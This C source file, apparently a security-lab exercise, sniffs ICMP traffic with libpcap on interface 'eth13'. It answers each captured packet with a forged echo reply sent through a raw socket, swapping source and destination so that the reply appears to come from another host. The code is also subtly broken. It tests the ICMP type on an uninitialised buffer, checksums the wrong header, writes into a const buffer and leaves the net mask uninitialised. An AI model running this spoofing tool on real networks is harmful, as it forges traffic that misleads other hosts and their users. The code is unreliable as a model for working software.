/*
Sniffing and spoofing a simple ICMP request
Done By : Dhruv Verma (C) 2017 gothinski
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <pcap.h>
#include "checksum.c"

void send_raw_ip_packet(struct ipheader* ip)
{	
	struct sockaddr_in dest_info;
	int enable = 1;
	
	//creat a raw network socket and set its options
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	
	//provide information about destination
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	//sed the packet out
	printf("Sending spoofed ICMP packet ...\n");
	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr*)&dest_info, sizeof(dest_info));
	close(sock);
}
	
void spoof(struct ipheader* ip) 
{
	int ip_header_len = ip->iph_ihl * 4;
	const char buffer[1500];
	
	//filling in icmp
	struct icmpheader *icmp = (struct icmpheader *) (buffer + sizeof(struct ipheader));
	if (icmp->icmp_type==8)
	{ return;
	}

	//making a copy
	memset((char*)buffer, 0, 1500);
	memcpy((char*)buffer, ip, ntohs(ip->iph_len));
	struct ipheader * newip = (struct ipheader *) buffer;
	struct icmpheader *newicmp = (struct icmpheader *) (buffer + sizeof(struct ipheader));

	newicmp->icmp_type = 0;
	newicmp->icmp_chksum = 0;
	newicmp->icmp_chksum = in_cksum((unsigned short *)icmp, sizeof(struct icmpheader));
	//filling in ip
	newip->iph_sourceip = ip->iph_destip;
	newip->iph_destip = ip->iph_sourceip;
	newip->iph_ttl = 50;
	newip->iph_len = ip->iph_len;
	send_raw_ip_packet(newip);
}


void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	struct ethheader *eth = (struct ethheader *)packet;
	if (eth->ether_type != ntohs(0x0800)) return;
	
	struct ipheader* ip = (struct ipheader*)(packet + SIZE_ETHERNET);
	int ip_header_len = ip->iph_ihl * 4;

	printf("**************************");
	printf("         From: %s\n", inet_ntoa(ip->iph_sourceip));
	printf("         To: %s\n", inet_ntoa(ip->iph_destip));
	printf(" 	 Protocol :  ICMP\n");
	spoof(ip);
}




int main()
{
	pcap_t *handle;
	char errbuf[1000];
	struct bpf_program fp;
	char filter_exp[] = "proto icmp";
	bpf_u_int32 net;

	//open live pcap sessions on NIC with name eth13
	handle = pcap_open_live("eth13", BUFSIZ, 1, 1000, errbuf);
	
	//compile filter_Exp into BFP pseudo-code
	pcap_compile(handle, &fp, filter_exp, 0, net);

	pcap_setfilter(handle, &fp);
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle);
	return 0;
}





